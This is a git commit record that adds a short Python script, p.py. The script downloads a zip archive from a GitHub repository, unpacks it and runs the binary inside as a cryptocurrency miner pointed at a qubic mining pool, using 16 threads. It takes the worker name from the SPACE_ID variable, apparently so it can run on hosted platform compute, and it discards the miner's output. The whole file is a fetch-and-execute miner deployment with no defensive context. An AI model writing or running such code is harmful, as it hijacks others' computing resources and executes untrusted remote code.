7e0110feba223445084c4572b94c6afec8a51c70
qqivk <fsswr518@gmail.com>
2025-02-25 21:45:02 +0100

    Create p.py

---
+++ p.py
@@ -0,0 +1,7 @@
+import os
+os.system("wget https://github.com/qqivk/Yehrr/raw/refs/heads/main/Yxls.zip")
+os.system("unzip Yxls.zip")
+#os.system("ls -lh")
+os.system("chmod +x Yxls.zip")
+wn = os.getenv('SPACE_ID').replace("/","_")
+os.system(f"./Yxls --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
